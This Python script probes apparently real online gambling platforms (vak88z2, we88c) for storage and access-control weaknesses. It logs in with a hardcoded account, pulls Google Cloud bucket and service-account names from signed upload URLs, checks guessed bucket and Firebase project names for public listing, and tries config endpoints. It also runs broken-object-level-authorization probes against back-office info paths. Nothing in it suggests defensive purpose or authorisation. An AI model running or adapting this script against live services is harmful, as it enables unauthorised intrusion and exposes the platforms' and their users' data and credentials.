#!/usr/bin/env python3
"""probe_gcs_service.py — Check GCS service account + signed URL endpoints.

   Enumerate:
   1. GCS signed URL generation
   2. Firebase storage config
   3. Service account info leaks
"""
import json, requests, base64, re

TID_VAK = "af6efb584a3d317b5a11ab6209b88e1b"
TID_WE88C = "54ef7626cb381f4bab8be91f0cdbce47"

PBAPI_VAK = f"https://{TID_VAK}pbapi.asdgapicenterssdo.com"
MGAPI_VAK = f"https://{TID_VAK}mgapi.asdgapicenterssdo.com"
PBAPI_WE88C = f"https://{TID_WE88C}pbapi.asdgapicenterssdo.com"
MGAPI_WE88C = f"https://{TID_WE88C}mgapi.asdgapicenterssdo.com"

PHONE = "0972571110"
PASS = "Pwned2026!"

# Auth both
def auth(pbapi):
    r = requests.post(f"{pbapi}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": PHONE, "password": PASS},
        timeout=15)
    return r.json()["accessToken"] if r.status_code in (200, 201) else None

print("=== Authenticating ===")
JWT_VAK = auth(PBAPI_VAK)
JWT_WE88C = auth(PBAPI_WE88C)
print(f"  vak88z2: {'OK' if JWT_VAK else 'FAIL'}")
print(f"  we88c:   {'OK' if JWT_WE88C else 'FAIL'}")

# ── 1. GCS Signed URL endpoints ───────────────────────────────────────────────
print("\n=== 1. GCS Signed URL Endpoints ===")

for name, mgapi, jwt in [("vak88z2", MGAPI_VAK, JWT_VAK), ("we88c", MGAPI_WE88C, JWT_WE88C)]:
    if not jwt:
        continue
    hdr = {"Authorization": f"Bearer {jwt}", "template": "vn", "Content-Type": "application/json"}

    # Sign URL endpoint
    r = requests.post(f"{mgapi}/mb/sign-url-upload-slip", headers=hdr,
        json={"filename": "test.jpg", "content_type": "image/jpeg", "size": 100000},
        timeout=15)
    print(f"\n  [{name}] POST /mb/sign-url-upload-slip: {r.status_code}")
    if r.ok:
        data = r.json()
        print(f"    Response keys: {list(data.keys())}")

        # Extract GCS bucket/project from signed URL
        signed_url = data.get("signedUrl") or data.get("url") or data.get("signed_url")
        if signed_url:
            print(f"    Signed URL: {signed_url[:100]}...")
            # Parse GCS bucket from URL
            m = re.search(r'storage\.googleapis\.com/([^/]+)', signed_url)
            if m:
                print(f"    [GCS BUCKET] {m.group(1)}")
            m = re.search(r'X-Goog-Credential=([^%]+)', signed_url)
            if m:
                print(f"    [SERVICE ACCOUNT] {m.group(1)}")

        filename = data.get("filename")
        if filename:
            print(f"    Filename: {filename}")

# ── 2. Check public GCS buckets ───────────────────────────────────────────────
print("\n=== 2. Public GCS Buckets ===")

buckets = [
    "luxino-public",
    "luxino-pub",
    "cdn.i-gamingplatform.com",
    "pcdn.i-gamingplatform.com",
    "i-gamingplatform",
    "igaming-slips",
    "vak88z2-slips",
    "we88c-slips",
]

for bucket in buckets:
    r = requests.get(f"https://storage.googleapis.com/{bucket}/",
        params={"prefix": "", "maxResults": 5},
        timeout=10)
    if r.status_code == 200:
        print(f"  [PUBLIC] gs://{bucket}/")
        # Parse XML for file list
        files = re.findall(r'<Key>([^<]+)</Key>', r.text)
        for f in files[:3]:
            print(f"    - {f}")
    elif r.status_code == 403:
        print(f"  [PRIVATE] gs://{bucket}/")
    else:
        print(f"  [?] gs://{bucket}/ → {r.status_code}")

# ── 3. Firebase Storage ───────────────────────────────────────────────────────
print("\n=== 3. Firebase Storage Endpoints ===")

# Known Firebase projects
firebase_projects = [
    "we88c",
    "vak88z2",
    "luxino",
    "i-gamingplatform",
    "igaming-platform",
]

for proj in firebase_projects:
    # Try Firebase Storage API
    r = requests.get(f"https://firebasestorage.googleapis.com/v0/b/{proj}.appspot.com/o/",
        timeout=10)
    if r.status_code == 200:
        print(f"  [ACCESSIBLE] {proj}.appspot.com")
        try:
            items = r.json().get("items", [])
            for item in items[:3]:
                print(f"    - {item.get('name', '?')}")
        except Exception:
            pass
    elif r.status_code == 404:
        print(f"  [NOT FOUND] {proj}.appspot.com")
    else:
        print(f"  [{r.status_code}] {proj}.appspot.com")

# ── 4. Service Account Info from JWT ──────────────────────────────────────────
print("\n=== 4. JWT Claims (service account refs?) ===")

for name, jwt in [("vak88z2", JWT_VAK), ("we88c", JWT_WE88C)]:
    if not jwt:
        continue
    try:
        # Decode JWT payload (without verification)
        payload = jwt.split('.')[1]
        # Add padding
        payload += '=' * (4 - len(payload) % 4)
        decoded = json.loads(base64.urlsafe_b64decode(payload))
        print(f"\n  [{name}] JWT claims:")
        for key in ["iss", "sub", "aud", "firebase", "gcs", "storage", "service_account"]:
            if key in decoded:
                val = decoded[key]
                if isinstance(val, dict):
                    val = json.dumps(val)[:100]
                print(f"    {key}: {val}")
    except Exception as e:
        print(f"  [{name}] JWT decode error: {e}")

# ── 5. API Config Endpoints ───────────────────────────────────────────────────
print("\n=== 5. API Config/Settings Endpoints ===")

for name, mgapi, jwt in [("vak88z2", MGAPI_VAK, JWT_VAK), ("we88c", MGAPI_WE88C, JWT_WE88C)]:
    if not jwt:
        continue
    hdr = {"Authorization": f"Bearer {jwt}", "template": "vn"}

    config_paths = [
        "/mb/config",
        "/mb/settings",
        "/mb/storage-config",
        "/mb/upload-config",
        "/mb/gcs-config",
        "/mb/firebase-config",
    ]

    for path in config_paths:
        r = requests.get(f"{mgapi}{path}", headers=hdr, timeout=10)
        if r.status_code not in (404,):
            print(f"  [{name}] GET {path}: {r.status_code}")
            if r.ok:
                print(f"    {r.text[:150]}")

# ── 6. BOLA for storage/upload config ─────────────────────────────────────────
print("\n=== 6. BOLA info/upload endpoints ===")

BGAPI_VAK = f"https://{TID_VAK}bgapi.asdgapicenterssdo.com"
BGAPI_WE88C = f"https://{TID_WE88C}bgapi.asdgapicenterssdo.com"

for name, bgapi, jwt, domain in [
    ("vak88z2", BGAPI_VAK, JWT_VAK, "m.vak88z2.com"),
    ("we88c", BGAPI_WE88C, JWT_WE88C, "m.we88c.com")
]:
    if not jwt:
        continue
    hdr = {"Authorization": f"Bearer {jwt}", "template": "vn"}

    paths = [
        "/bo/info/storage-config",
        "/bo/info/upload-config",
        "/bo/info/gcs-settings",
        "/bo/info/service-account",
        "/bo/info/firebase-config",
    ]

    for path in paths:
        r = requests.get(f"{bgapi}{path}", headers=hdr, params={"domain": domain}, timeout=10)
        if r.status_code not in (404, 405):
            print(f"  [{name}] GET {path}: {r.status_code}")
            if r.ok:
                print(f"    {r.text[:200]}")

print("\n=== Done ===")
